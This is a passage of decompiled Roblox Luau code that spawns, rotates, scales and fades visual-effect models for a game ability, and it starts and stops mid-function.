                                                                v1808, v1809 = v1806(v1807, v1808)

                                                                if v1808 == nil then
                                                                    break
                                                                end
                                                                if v1809:IsA('Decal') then
                                                                    u10:Create(v1809, u1783, {Transparency = u1788}):Play()
                                                                end
                                                            end

                                                            u1800 = u1800:Create(_Start, u1783, {
                                                                Size = _End.Size,
                                                                CFrame = _End.CFrame,
                                                            })

                                                            u1800:Play()
                                                        else
                                                            u1800 = u1800:Create(_Start, u1783, {
                                                                Size = _End.Size,
                                                                Transparency = u1788,
                                                                CFrame = _End.CFrame,
                                                            })

                                                            u1800:Play()
                                                        end
                                                    end
                                                    if not _Stay then
                                                        if _Del then
                                                            task.wait(_Del + 0.1)
                                                        end

                                                        u1800.Completed:Connect(function()
                                                            _Model2:Destroy()
                                                        end)
                                                    end
                                                end
                                            end)

                                            local v1810 = u1663.WindTime:Clone()
                                            local v1811 = 2
                                            local v1812 = 4
                                            local v1813 = u86
                                            local v1814

                                            if v1812 or not v1811 then
                                                v1814 = v1811
                                                v1811 = v1812
                                            else
                                                v1814 = 1
                                            end
                                            if not (v1811 or v1814) then
                                                v1814 = 0
                                                v1811 = 1
                                            end

                                            v1810:ScaleTo(v1813:NextNumber(v1814, v1811) * 2.1)

                                            local v1815 = {
                                                Model = v1810,
                                                T = 0.9,
                                            }
                                            local _CFrame11 = _PrimaryPart5.CFrame
                                            local _Angles7 = CFrame.Angles
                                            local v1818 = -15
                                            local v1819 = 15
                                            local v1820 = u86
                                            local v1821

                                            if v1819 or not v1818 then
                                                v1821 = v1818
                                                v1818 = v1819
                                            else
                                                v1821 = 1
                                            end
                                            if not (v1818 or v1821) then
                                                v1821 = 0
                                                v1818 = 1
                                            end

                                            local v1822 = math.rad((v1820:NextNumber(v1821, v1818)))
                                            local v1823 = 0
                                            local v1824 = 360
                                            local v1825 = u86
                                            local v1826

                                            if v1824 or not v1823 then
                                                v1826 = v1823
                                                v1823 = v1824
                                            else
                                                v1826 = 1
                                            end
                                            if not (v1823 or v1826) then
                                                v1826 = 0
                                                v1823 = 1
                                            end

                                            local v1827 = math.rad((v1825:NextNumber(v1826, v1823)))
                                            local v1828 = -15
                                            local v1829 = 15
                                            local v1830 = u86
                                            local v1831

                                            if v1829 or not v1828 then
                                                v1831 = v1828
                                                v1828 = v1829
                                            else
                                                v1831 = 1
                                            end
                                            if not (v1828 or v1831) then
                                                v1831 = 0
                                                v1828 = 1
                                            end

                                            v1815.Anchor = _CFrame11 * _Angles7(v1822, v1827, (math.rad((v1830:NextNumber(v1831, v1828)))))

                                            local _new6 = TweenInfo.new
                                            local v1833 = 0.3
                                            local v1834 = 0.4
                                            local v1835 = u86
                                            local v1836

                                            if v1834 or not v1833 then
                                                v1836 = v1833
                                                v1833 = v1834
                                            else
                                                v1836 = 1
                                            end
                                            if not (v1833 or v1836) then
                                                v1836 = 0
                                                v1833 = 1
                                            end

                                            v1815.Info = _new6(v1835:NextNumber(v1836, v1833), Enum.EasingStyle.Sine)

                                            local u1837 = v1815

                                            task.spawn(function()
                                                local _Model3 = u1837.Model
                                                local u1839 = u1837.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                local _Start2 = _Model3:FindFirstChild('Start')
                                                local _End2 = _Model3:FindFirstChild('End')
                                                local _Stay2 = u1837.Stay
                                                local _Anchor3 = u1837.Anchor
                                                local u1844 = u1837.EndT or 1
                                                local _Del2 = u1837.Del
                                                local _Skip2 = u1837.Skip

                                                if _Start2 and _End2 then
                                                    _Model3.PrimaryPart = _Start2

                                                    if not _Skip2 then
                                                        local v1847, v1848, v1849 = pairs(_Model3:GetChildren())

                                                        while true do
                                                            local v1850, v1851 = v1847(v1848, v1849)

                                                            if v1850 == nil then
                                                                break
                                                            end

                                                            v1849 = v1850

                                                            if v1851:IsA('BasePart') then
                                                                v1851.CanCollide = false
                                                                v1851.Anchored = true
                                                            end
                                                        end
                                                    end
                                                    if _Anchor3 then
                                                        _Model3:SetPrimaryPartCFrame(_Anchor3)
                                                    end
                                                    if u1837.T then
                                                        _Start2.Transparency = u1837.T
                                                    end

                                                    _End2.Transparency = 1
                                                    _Model3.Parent = workspace.Thrown

                                                    local _Decal6 = _Start2:FindFirstChildOfClass('Decal')
                                                    local _SpecialMesh6 = _Start2:FindFirstChildOfClass('SpecialMesh')
                                                    local _SpecialMesh7 = _End2:FindFirstChildOfClass('SpecialMesh')
                                                    local _Decal7 = _End2:FindFirstChildOfClass('Decal')

                                                    if _Decal7 and not _Skip2 then
                                                        _Decal7.Transparency = 1
                                                    end

                                                    local u1856 = u10

                                                    if _Del2 then
                                                        u10:Create(_Start2, u1839, {
                                                            Size = _End2.Size,
                                                            CFrame = _End2.CFrame,
                                                        }):Play()
                                                        task.delay(_Del2, function()
                                                            u1856:Create(_Start2, u1839, {Transparency = u1844})
                                                            u1856:Play()

                                                            if _Decal6 then
                                                                local v1857 = _Start2
                                                                local v1858, v1859, v1860 = pairs(v1857:GetChildren())

                                                                while true do
                                                                    local v1861

                                                                    v1860, v1861 = v1858(v1859, v1860)

                                                                    if v1860 == nil then
                                                                        break
                                                                    end
                                                                    if v1861:IsA('Decal') then
                                                                        u10:Create(v1861, u1839, {Transparency = u1844}):Play()
                                                                    end
                                                                end
                                                            end
                                                            if _SpecialMesh6 then
                                                                u1856:Create(_SpecialMesh6, u1839, {
                                                                    Scale = _SpecialMesh7.Scale,
                                                                }):Play()
                                                            end
                                                        end)
                                                    else
                                                        if _SpecialMesh6 then
                                                            u10:Create(_SpecialMesh6, u1839, {
                                                                Scale = _SpecialMesh7.Scale,
                                                            }):Play()
                                                        end
                                                        if _Decal6 then
                                                            local v1862, v1863, v1864 = pairs(_Start2:GetChildren())

                                                            while true do
                                                                local v1865

                                                                v1864, v1865 = v1862(v1863, v1864)

                                                                if v1864 == nil then
                                                                    break
                                                                end
                                                                if v1865:IsA('Decal') then
                                                                    u10:Create(v1865, u1839, {Transparency = u1844}):Play()
                                                                end
                                                            end

                                                            u1856 = u1856:Create(_Start2, u1839, {
                                                                Size = _End2.Size,
                                                                CFrame = _End2.CFrame,
                                                            })

                                                            u1856:Play()
                                                        else
                                                            u1856 = u1856:Create(_Start2, u1839, {
                                                                Size = _End2.Size,
                                                                Transparency = u1844,
                                                                CFrame = _End2.CFrame,
                                                            })

                                                            u1856:Play()
                                                        end
                                                    end
                                                    if not _Stay2 then
                                                        if _Del2 then
                                                            task.wait(_Del2 + 0.1)
                                                        end

                                                        u1856.Completed:Connect(function()
                                                            _Model3:Destroy()
                                                        end)
                                                    end
                                                end
                                            end)

                                            local v1866 = u1663.WindTimeGlass:Clone()
                                            local v1867 = 2
                                            local v1868 = 4
                                            local v1869 = u86
                                            local v1870

                                            if v1868 or not v1867 then
                                                v1870 = v1867
                                                v1867 = v1868
                                            else
                                                v1870 = 1
                                            end
                                            if not (v1867 or v1870) then
                                                v1870 = 0
                                                v1867 = 1
                                            end

                                            v1866:ScaleTo(v1869:NextNumber(v1870, v1867) * 2.1)

                                            local u1871 = {
                                                Model = v1866,
                                                T = 0.9,
                                            }
                                            local _CFrame12 = _PrimaryPart5.CFrame
                                            local _Angles8 = CFrame.Angles
                                            local v1874 = -15
                                            local v1875 = 15
                                            local v1876 = u86
                                            local v1877

                                            if v1875 or not v1874 then
                                                v1877 = v1874
                                                v1874 = v1875
                                            else
                                                v1877 = 1
                                            end
                                            if not (v1874 or v1877) then
                                                v1877 = 0
                                                v1874 = 1
                                            end

                                            local v1878 = math.rad((v1876:NextNumber(v1877, v1874)))
                                            local v1879 = 0
                                            local v1880 = 360
                                            local v1881 = u86
                                            local v1882

                                            if v1880 or not v1879 then
                                                v1882 = v1879
                                                v1879 = v1880
                                            else
                                                v1882 = 1
                                            end
                                            if not (v1879 or v1882) then
                                                v1882 = 0
                                                v1879 = 1
                                            end

                                            local v1883 = math.rad((v1881:NextNumber(v1882, v1879)))
                                            local v1884 = -15
                                            local v1885 = 15
                                            local v1886 = u86
                                            local v1887

                                            if v1885 or not v1884 then
                                                v1887 = v1884
                                                v1884 = v1885
                                            else
                                                v1887 = 1
                                            end
                                            if not (v1884 or v1887) then
                                                v1887 = 0
                                                v1884 = 1
                                            end

                                            u1871.Anchor = _CFrame12 * _Angles8(v1878, v1883, (math.rad((v1886:NextNumber(v1887, v1884)))))

                                            local _new7 = TweenInfo.new
                                            local v1889 = 0.3
                                            local v1890 = 0.4
                                            local v1891 = u86
                                            local v1892

                                            if v1890 or not v1889 then
                                                v1892 = v1889
                                                v1889 = v1890
                                            else
                                                v1892 = 1
                                            end
                                            if not (v1889 or v1892) then
                                                v1892 = 0
                                                v1889 = 1
                                            end

                                            u1871.Info = _new7(v1891:NextNumber(v1892, v1889), Enum.EasingStyle.Sine)

                                            task.spawn(function()
                                                local _Model4 = u1871.Model
                                                local u1894 = u1871.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                local _Start3 = _Model4:FindFirstChild('Start')
                                                local _End3 = _Model4:FindFirstChild('End')
                                                local _Stay3 = u1871.Stay
                                                local _Anchor4 = u1871.Anchor
                                                local u1899 = u1871.EndT or 1
                                                local _Del3 = u1871.Del
                                                local _Skip3 = u1871.Skip

                                                if _Start3 and _End3 then
                                                    _Model4.PrimaryPart = _Start3

                                                    if not _Skip3 then
                                                        local v1902, v1903, v1904 = pairs(_Model4:GetChildren())

                                                        while true do
                                                            local v1905, v1906 = v1902(v1903, v1904)

                                                            if v1905 == nil then
                                                                break
                                                            end

                                                            v1904 = v1905

                                                            if v1906:IsA('BasePart') then
                                                                v1906.CanCollide = false
                                                                v1906.Anchored = true
                                                            end
                                                        end
                                                    end
                                                    if _Anchor4 then
                                                        _Model4:SetPrimaryPartCFrame(_Anchor4)
                                                    end
                                                    if u1871.T then
                                                        _Start3.Transparency = u1871.T
                                                    end

                                                    _End3.Transparency = 1
                                                    _Model4.Parent = workspace.Thrown

                                                    local _Decal8 = _Start3:FindFirstChildOfClass('Decal')
                                                    local _SpecialMesh8 = _Start3:FindFirstChildOfClass('SpecialMesh')
                                                    local _SpecialMesh9 = _End3:FindFirstChildOfClass('SpecialMesh')
                                                    local _Decal9 = _End3:FindFirstChildOfClass('Decal')

                                                    if _Decal9 and not _Skip3 then
                                                        _Decal9.Transparency = 1
                                                    end

                                                    local u1911 = u10

                                                    if _Del3 then
                                                        u10:Create(_Start3, u1894, {
                                                            Size = _End3.Size,
                                                            CFrame = _End3.CFrame,
                                                        }):Play()
                                                        task.delay(_Del3, function()
                                                            u1911:Create(_Start3, u1894, {Transparency = u1899})
                                                            u1911:Play()

                                                            if _Decal8 then
                                                                local v1912 = _Start3
                                                                local v1913, v1914, v1915 = pairs(v1912:GetChildren())

                                                                while true do
                                                                    local v1916

                                                                    v1915, v1916 = v1913(v1914, v1915)

                                                                    if v1915 == nil then
                                                                        break
                                                                    end
                                                                    if v1916:IsA('Decal') then
                                                                        u10:Create(v1916, u1894, {Transparency = u1899}):Play()
                                                                    end
                                                                end
                                                            end
                                                            if _SpecialMesh8 then
                                                                u1911:Create(_SpecialMesh8, u1894, {
                                                                    Scale = _SpecialMesh9.Scale,
                                                                }):Play()
                                                            end
                                                        end)
                                                    else
                                                        if _SpecialMesh8 then
                                                            u10:Create(_SpecialMesh8, u1894, {
                                                                Scale = _SpecialMesh9.Scale,
                                                            }):Play()
                                                        end
                                                        if _Decal8 then
                                                            local v1917, v1918, v1919 = pairs(_Start3:GetChildren())

                                                            while true do
                                                                local v1920

                                                                v1919, v1920 = v1917(v1918, v1919)

                                                                if v1919 == nil then
                                                                    break
                                                                end
                                                                if v1920:IsA('Decal') then
                                                                    u10:Create(v1920, u1894, {Transparency = u1899}):Play()
                                                                end
                                                            end

                                                            u1911 = u1911:Create(_Start3, u1894, {
                                                                Size = _End3.Size,
                                                                CFrame = _End3.CFrame,
                                                            })

                                                            u1911:Play()
                                                        else
                                                            u1911 = u1911:Create(_Start3, u1894, {
                                                                Size = _End3.Size,
                                                                Transparency = u1899,
                                                                CFrame = _End3.CFrame,
                                                            })

                                                            u1911:Play()
                                                        end
                                                    end
                                                    if not _Stay3 then
                                                        if _Del3 then
                                                            task.wait(_Del3 + 0.1)
                                                        end

                                                        u1911.Completed:Connect(function()
                                                            _Model4:Destroy()
                                                        end)
                                                    end
                                                end
                                            end)
                                            task.wait(0.03)
                                        end

                                        task.wait(0.03)
                                        u424({
                                            FX = u1664.Lines,
                                            On = false,
                                        })
                                    end,
                                    [215] = function()
                                        for v1921 = 1, 4 do
                                            local v1922 = u1664._maid:give(u1663.Whirl:Clone())
                                            local v1923 = u1664.StoicBoomEntrance.CFrame * CFrame.new(0, 3, 0)
                                            local _Angles9 = CFrame.Angles
                                            local v1925 = -45
                                            local v1926 = 45
                                            local v1927 = u329
                                            local v1928

                                            if v1926 or not v1925 then
                                                v1928 = v1925
                                                v1925 = v1926
                                            else
                                                v1928 = 1
                                            end
                                            if not (v1925 or v1928) then
                                                v1928 = 0
                                                v1925 = 1
                                            end

                                            local v1929 = math.rad((v1927:NextNumber(v1928, v1925)))
                                            local v1930 = 0
                                            local v1931 = 360
                                            local v1932 = u329
                                            local v1933

                                            if v1931 or not v1930 then
                                                v1933 = v1930
                                                v1930 = v1931
                                            else
                                                v1933 = 1
                                            end
                                            if not (v1930 or v1933) then
                                                v1933 = 0
                                                v1930 = 1
                                            end

                                            local v1934 = math.rad((v1932:NextNumber(v1933, v1930)))
                                            local v1935 = -45
                                            local v1936 = 45
                                            local v1937 = u329
                                            local v1938

                                            if v1936 or not v1935 then
                                                v1938 = v1935
                                                v1935 = v1936
                                            else
                                                v1938 = 1
                                            end
                                            if not (v1935 or v1938) then
                                                v1938 = 0
                                                v1935 = 1
                                            end

                                            v1922:SetPrimaryPartCFrame(v1923 * _Angles9(v1929, v1934, (math.rad((v1937:NextNumber(v1938, v1935))))))

                                            local v1939 = 1.2
                                            local v1940 = 1
                                            local v1941 = u329
                                            local v1942

                                            if v1940 or not v1939 then
                                                v1942 = v1939
                                                v1939 = v1940
                                            else
                                                v1942 = 1
                                            end
                                            if not (v1939 or v1942) then
                                                v1942 = 0
                                                v1939 = 1
                                            end

                                            v1922:ScaleTo(v1941:NextNumber(v1942, v1939) * v1921 * 2.1)

                                            local v1943 = u246
                                            local v1944 = {FX = v1922}
                                            local v1945 = 0.4
                                            local v1946 = 1.5
                                            local v1947 = u329
                                            local v1948

                                            if v1946 or not v1945 then
                                                v1948 = v1945
                                                v1945 = v1946
                                            else
                                                v1948 = 1
                                            end
                                            if not (v1945 or v1948) then
                                                v1948 = 0
                                                v1945 = 1
                                            end

                                            v1944.Scale = v1947:NextNumber(v1948, v1945)

                                            v1943(v1944)

                                            v1922.Parent = workspace.Thrown

                                            u439(v1922)
                                            task.wait(0.01)
                                        end
                                    end,
                                    [214] = function()
                                        u1664.SPREAD = u1664._maid:give(u1663.SPREAD:Clone())

                                        u1664.SPREAD:SetPrimaryPartCFrame(u1666.PrimaryPart.CFrame * CFrame.new(0, -5, 0))
                                        u246({
                                            FX = u1664.SPREAD,
                                            Scale = 0.22499999999999998,
                                        })

                                        u1664.SPREAD.Parent = workspace.Thrown

                                        u439(u1664.SPREAD)
                                        u1664.SPREAD:ScaleTo(21)

                                        for v1949 = 1, 3 do
                                            local v1950 = u1663.Outty:Clone()

                                            v1950:SetPrimaryPartCFrame(u1664.StoicBoomEntrance.CFrame * CFrame.new(0, 8 * v1949, 0))
                                            v1950:ScaleTo((4 - v1949) * 2.1)

                                            local u1951 = {
                                                Model = v1950,
                                                Info = TweenInfo.new(0.4, Enum.EasingStyle.Exponential),
                                                T = 0.8,
                                            }

                                            task.spawn(function()
                                                local _Model5 = u1951.Model
                                                local u1953 = u1951.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                local _Start4 = _Model5:FindFirstChild('Start')
                                                local _End4 = _Model5:FindFirstChild('End')
                                                local _Stay4 = u1951.Stay
                                                local _Anchor5 = u1951.Anchor
                                                local u1958 = u1951.EndT or 1
                                                local _Del4 = u1951.Del
                                                local _Skip4 = u1951.Skip

                                                if _Start4 and _End4 then
                                                    _Model5.PrimaryPart = _Start4

                                                    if not _Skip4 then
                                                        local v1961, v1962, v1963 = pairs(_Model5:GetChildren())

                                                        while true do
                                                            local v1964, v1965 = v1961(v1962, v1963)

                                                            if v1964 == nil then
                                                                break
                                                            end

                                                            v1963 = v1964

                                                            if v1965:IsA('BasePart') then
                                                                v1965.CanCollide = false
                                                                v1965.Anchored = true
                                                            end
                                                        end
                                                    end
                                                    if _Anchor5 then
                                                        _Model5:SetPrimaryPartCFrame(_Anchor5)
                                                    end
                                                    if u1951.T then
                                                        _Start4.Transparency = u1951.T
                                                    end

                                                    _End4.Transparency = 1
                                                    _Model5.Parent = workspace.Thrown

                                                    local _Decal10 = _Start4:FindFirstChildOfClass('Decal')
                                                    local _SpecialMesh10 = _Start4:FindFirstChildOfClass('SpecialMesh')
                                                    local _SpecialMesh11 = _End4:FindFirstChildOfClass('SpecialMesh')
                                                    local u1969 = u10

                                                    if _Del4 then
                                                        u10:Create(_Start4, u1953, {
                                                            Size = _End4.Size,
                                                            CFrame = _End4.CFrame,
                                                        }):Play()
                                                        task.delay(_Del4, function()
                                                            u1969:Create(_Start4, u1953, {Transparency = u1958})
                                                            u1969:Play()

                                                            if _Decal10 then
                                                                local v1970 = _Start4
                                                                local v1971, v1972, v1973 = pairs(v1970:GetChildren())

                                                                while true do
                                                                    local v1974

                                                                    v1973, v1974 = v1971(v1972, v1973)

                                                                    if v1973 == nil then
                                                                        break
                                                                    end
                                                                    if v1974:IsA('Decal') then
                                                                        u10:Create(v1974, u1953, {Transparency = u1958}):Play()
                                                                    end
                                                                end
                                                            end
                                                            if _SpecialMesh10 then
                                                                u1969:Create(_SpecialMesh10, u1953, {
                                                                    Scale = _SpecialMesh11.Scale,
                                                                }):Play()
                                                            end
                                                        end)
                                                    else
                                                        if _SpecialMesh10 then
                                                            u10:Create(_SpecialMesh10, u1953, {
                                                                Scale = _SpecialMesh11.Scale,
                                                            }):Play()
                                                        end
                                                        if _Decal10 then
                                                            local v1975, v1976, v1977 = pairs(_Start4:GetChildren())

                                                            while true do
                                                                local v1978

                                                                v1977, v1978 = v1975(v1976, v1977)

                                                                if v1977 == nil then
                                                                    break
                                                                end
                                                                if v1978:IsA('Decal') then
                                                                    u10:Create(v1978, u1953, {Transparency = u1958}):Play()
                                                                end
                                                            end

                                                            u1969 = u1969:Create(_Start4, u1953, {
                                                                Size = _End4.Size,
                                                                CFrame = _End4.CFrame,
                                                            })

                                                            u1969:Play()
                                                        else
                                                            u1969 = u1969:Create(_Start4, u1953, {
                                                                Size = _End4.Size,
                                                                Transparency = u1958,
                                                                CFrame = _End4.CFrame,
                                                            })

                                                            u1969:Play()
                                                        end
                                                    end
                                                    if not _Stay4 then
                                                        if _Del4 then
                                                            task.wait(_Del4 + 0.1)
                                                        end

                                                        u1969.Completed:Once(function()
                                                            _Model5:Destroy()
                                                        end)
                                                    end
                                                end
                                            end)
                                        end

                                        task.spawn(function()
                                            for _ = 1, 6 do
                                                local v1979 = u1663.WindTime:Clone()
                                                local v1980 = 2
                                                local v1981 = 4
                                                local v1982 = u329
                                                local v1983

                                                if v1981 or not v1980 then
                                                    v1983 = v1980
                                                    v1980 = v1981
                                                else
                                                    v1983 = 1
                                                end
                                                if not (v1980 or v1983) then
                                                    v1983 = 0
                                                    v1980 = 1
                                                end

                                                v1979:ScaleTo(v1982:NextNumber(v1983, v1980) * 2.1)

                                                local u1984 = {
                                                    Model = v1979,
                                                    T = 0.9,
                                                }
                                                local _CFrame13 = _PrimaryPart5.CFrame
                                                local _Angles10 = CFrame.Angles
                                                local v1987 = -15
                                                local v1988 = 15
                                                local v1989 = u329
                                                local v1990

                                                if v1988 or not v1987 then
                                                    v1990 = v1987
                                                    v1987 = v1988
                                                else
                                                    v1990 = 1
                                                end
                                                if not (v1987 or v1990) then
                                                    v1990 = 0
                                                    v1987 = 1
                                                end

                                                local v1991 = math.rad((v1989:NextNumber(v1990, v1987)))
                                                local v1992 = 0
                                                local v1993 = 360
                                                local v1994 = u329
                                                local v1995

                                                if v1993 or not v1992 then
                                                    v1995 = v1992
                                                    v1992 = v1993
                                                else
                                                    v1995 = 1
                                                end
                                                if not (v1992 or v1995) then
                                                    v1995 = 0
                                                    v1992 = 1
                                                end

                                                local v1996 = math.rad((v1994:NextNumber(v1995, v1992)))
                                                local v1997 = -15
                                                local v1998 = 15
                                                local v1999 = u329
                                                local v2000

                                                if v1998 or not v1997 then
                                                    v2000 = v1997
                                                    v1997 = v1998
                                                else
                                                    v2000 = 1
                                                end
                                                if not (v1997 or v2000) then
                                                    v2000 = 0
                                                    v1997 = 1
                                                end

                                                u1984.Anchor = _CFrame13 * _Angles10(v1991, v1996, (math.rad((v1999:NextNumber(v2000, v1997)))))

                                                local _new8 = TweenInfo.new
                                                local v2002 = 0.3
                                                local v2003 = 0.4
                                                local v2004 = u329
                                                local v2005

                                                if v2003 or not v2002 then
                                                    v2005 = v2002
                                                    v2002 = v2003
                                                else
                                                    v2005 = 1
                                                end
                                                if not (v2002 or v2005) then
                                                    v2005 = 0
                                                    v2002 = 1
                                                end

                                                u1984.Info = _new8(v2004:NextNumber(v2005, v2002), Enum.EasingStyle.Sine)

                                                task.spawn(function()
                                                    local _Model6 = u1984.Model
                                                    local u2007 = u1984.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                    local _Start5 = _Model6:FindFirstChild('Start')
                                                    local _End5 = _Model6:FindFirstChild('End')
                                                    local _Stay5 = u1984.Stay
                                                    local _Anchor6 = u1984.Anchor
                                                    local u2012 = u1984.EndT or 1
                                                    local _Del5 = u1984.Del
                                                    local _Skip5 = u1984.Skip

                                                    if _Start5 and _End5 then
                                                        _Model6.PrimaryPart = _Start5

                                                        if not _Skip5 then
                                                            local v2015, v2016, v2017 = pairs(_Model6:GetChildren())

                                                            while true do
                                                                local v2018, v2019 = v2015(v2016, v2017)

                                                                if v2018 == nil then
                                                                    break
                                                                end

                                                                v2017 = v2018

                                                                if v2019:IsA('BasePart') then
                                                                    v2019.CanCollide = false
                                                                    v2019.Anchored = true
                                                                end
                                                            end
                                                        end
                                                        if _Anchor6 then
                                                            _Model6:SetPrimaryPartCFrame(_Anchor6)
                                                        end
                                                        if u1984.T then
                                                            _Start5.Transparency = u1984.T
                                                        end

                                                        _End5.Transparency = 1
                                                        _Model6.Parent = workspace.Thrown

                                                        local _Decal11 = _Start5:FindFirstChildOfClass('Decal')
                                                        local _SpecialMesh12 = _Start5:FindFirstChildOfClass('SpecialMesh')
                                                        local _SpecialMesh13 = _End5:FindFirstChildOfClass('SpecialMesh')
                                                        local u2023 = u10

                                                        if _Del5 then
                                                            u10:Create(_Start5, u2007, {
                                                                Size = _End5.Size,
                                                                CFrame = _End5.CFrame,
                                                            }):Play()
                                                            task.delay(_Del5, function()
                                                                u2023:Create(_Start5, u2007, {Transparency = u2012})
                                                                u2023:Play()

                                                                if _Decal11 then
                                                                    local v2024 = _Start5
                                                                    local v2025, v2026, v2027 = pairs(v2024:GetChildren())

                                                                    while true do
                                                                        local v2028

                                                                        v2027, v2028 = v2025(v2026, v2027)

                                                                        if v2027 == nil then
                                                                            break
                                                                        end
                                                                        if v2028:IsA('Decal') then
                                                                            u10:Create(v2028, u2007, {Transparency = u2012}):Play()
                                                                        end
                                                                    end
                                                                end
                                                                if _SpecialMesh12 then
                                                                    u2023:Create(_SpecialMesh12, u2007, {
                                                                        Scale = _SpecialMesh13.Scale,
                                                                    }):Play()
                                                                end
                                                            end)
                                                        else
                                                            if _SpecialMesh12 then
                                                                u10:Create(_SpecialMesh12, u2007, {
                                                                    Scale = _SpecialMesh13.Scale,
                                                                }):Play()
                                                            end
                                                            if _Decal11 then
                                                                local v2029, v2030, v2031 = pairs(_Start5:GetChildren())

                                                                while true do
                                                                    local v2032

                                                                    v2031, v2032 = v2029(v2030, v2031)

                                                                    if v2031 == nil then
                                                                        break
                                                                    end
                                                                    if v2032:IsA('Decal') then
                                                                        u10:Create(v2032, u2007, {Transparency = u2012}):Play()
                                                                    end
                                                                end

                                                                u2023 = u2023:Create(_Start5, u2007, {
                                                                    Size = _End5.Size,
                                                                    CFrame = _End5.CFrame,
                                                                })

                                                                u2023:Play()
                                                            else
                                                                u2023 = u2023:Create(_Start5, u2007, {
                                                                    Size = _End5.Size,
                                                                    Transparency = u2012,
                                                                    CFrame = _End5.CFrame,
                                                                })

                                                                u2023:Play()
                                                            end
                                                        end
                                                        if not _Stay5 then
                                                            if _Del5 then
                                                                task.wait(_Del5 + 0.1)
                                                            end

                                                            u2023.Completed:Once(function()
                                                                _Model6:Destroy()
                                                            end)
                                                        end
                                                    end
                                                end)
                                                task.wait(0.025)
                                            end
                                        end)

                                        for v2033 = 1, 3 do
                                            local v2034 = u1663.GAG:Clone()

                                            v2034:SetPrimaryPartCFrame(u1664.StoicBoomEntrance.CFrame * CFrame.new(0, 3, 0) * CFrame.Angles(0, math.rad((math.random(0, 360))), 1.5707963267948966))
                                            v2034:ScaleTo(v2033 * 2.1)

                                            local u2035 = {
                                                Model = v2034,
                                                Info = TweenInfo.new(2, Enum.EasingStyle.Exponential),
                                                T = 1,
                                            }

                                            task.spawn(function()
                                                local _Model7 = u2035.Model
                                                local u2037 = u2035.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                local _Start6 = _Model7:FindFirstChild('Start')
                                                local _End6 = _Model7:FindFirstChild('End')
                                                local _Stay6 = u2035.Stay
                                                local _Anchor7 = u2035.Anchor
                                                local u2042 = u2035.EndT or 1
                                                local _Del6 = u2035.Del
                                                local _Skip6 = u2035.Skip

                                                if _Start6 and _End6 then
                                                    _Model7.PrimaryPart = _Start6

                                                    if not _Skip6 then
                                                        local v2045, v2046, v2047 = pairs(_Model7:GetChildren())

                                                        while true do
                                                            local v2048, v2049 = v2045(v2046, v2047)

                                                            if v2048 == nil then
                                                                break
                                                            end

                                                            v2047 = v2048

                                                            if v2049:IsA('BasePart') then
                                                                v2049.CanCollide = false
                                                                v2049.Anchored = true
                                                            end
                                                        end
                                                    end
                                                    if _Anchor7 then
                                                        _Model7:SetPrimaryPartCFrame(_Anchor7)
                                                    end
                                                    if u2035.T then
                                                        _Start6.Transparency = u2035.T
                                                    end

                                                    _End6.Transparency = 1
                                                    _Model7.Parent = workspace.Thrown

                                                    local _Decal12 = _Start6:FindFirstChildOfClass('Decal')
                                                    local _SpecialMesh14 = _Start6:FindFirstChildOfClass('SpecialMesh')
                                                    local _SpecialMesh15 = _End6:FindFirstChildOfClass('SpecialMesh')
                                                    local u2053 = u10

                                                    if _Del6 then
                                                        u10:Create(_Start6, u2037, {
                                                            Size = _End6.Size,
                                                            CFrame = _End6.CFrame,
                                                        }):Play()
                                                        task.delay(_Del6, function()
                                                            u2053:Create(_Start6, u2037, {Transparency = u2042})
                                                            u2053:Play()

                                                            if _Decal12 then
                                                                local v2054 = _Start6
                                                                local v2055, v2056, v2057 = pairs(v2054:GetChildren())

                                                                while true do
                                                                    local v2058

                                                                    v2057, v2058 = v2055(v2056, v2057)

                                                                    if v2057 == nil then
                                                                        break
                                                                    end
                                                                    if v2058:IsA('Decal') then
                                                                        u10:Create(v2058, u2037, {Transparency = u2042}):Play()
                                                                    end
                                                                end
                                                            end
                                                            if _SpecialMesh14 then
                                                                u2053:Create(_SpecialMesh14, u2037, {
                                                                    Scale = _SpecialMesh15.Scale,
                                                                }):Play()
                                                            end
                                                        end)
                                                    else
                                                        if _SpecialMesh14 then
                                                            u10:Create(_SpecialMesh14, u2037, {
                                                                Scale = _SpecialMesh15.Scale,
                                                            }):Play()
                                                        end
                                                        if _Decal12 then
                                                            local v2059, v2060, v2061 = pairs(_Start6:GetChildren())

                                                            while true do
                                                                local v2062

                                                                v2061, v2062 = v2059(v2060, v2061)

                                                                if v2061 == nil then
                                                                    break
                                                                end
                                                                if v2062:IsA('Decal') then
                                                                    u10:Create(v2062, u2037, {Transparency = u2042}):Play()
                                                                end
                                                            end

                                                            u2053 = u2053:Create(_Start6, u2037, {
                                                                Size = _End6.Size,
                                                                CFrame = _End6.CFrame,
                                                            })

                                                            u2053:Play()
                                                        else
                                                            u2053 = u2053:Create(_Start6, u2037, {
                                                                Size = _End6.Size,
                                                                Transparency = u2042,
                                                                CFrame = _End6.CFrame,
                                                            })

                                                            u2053:Play()
                                                        end
                                                    end
                                                    if not _Stay6 then
                                                        if _Del6 then
                                                            task.wait(_Del6 + 0.1)
                                                        end

                                                        u2053.Completed:Once(function()
                                                            _Model7:Destroy()
                                                        end)
                                                    end
                                                end
                                            end)
                                        end

                                        task.spawn(function()
                                            for v2063 = 1, 3 do
                                                local v2064 = u1663.Brother:Clone()

                                                v2064:SetPrimaryPartCFrame(u1664.StoicBoomEntrance.CFrame * CFrame.new(0, 8 * v2063, 0) * CFrame.Angles(0, math.rad((math.random(0, 360))), 1.5707963267948966))
                                                v2064:ScaleTo(0.5 * v2063 * 2.1)

                                                if v2063 == 3 then
                                                    local u2065 = {
                                                        Model = v2064,
                                                        Info = TweenInfo.new(0.15 * v2063, Enum.EasingStyle.Exponential),
                                                        T = 1,
                                                    }

                                                    task.spawn(function()
                                                        local _Model8 = u2065.Model
                                                        local u2067 = u2065.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                        local _Start7 = _Model8:FindFirstChild('Start')
                                                        local _End7 = _Model8:FindFirstChild('End')
                                                        local _Stay7 = u2065.Stay
                                                        local _Anchor8 = u2065.Anchor
                                                        local u2072 = u2065.EndT or 1
                                                        local _Del7 = u2065.Del
                                                        local _Skip7 = u2065.Skip

                                                        if _Start7 and _End7 then
                                                            _Model8.PrimaryPart = _Start7

                                                            if not _Skip7 then
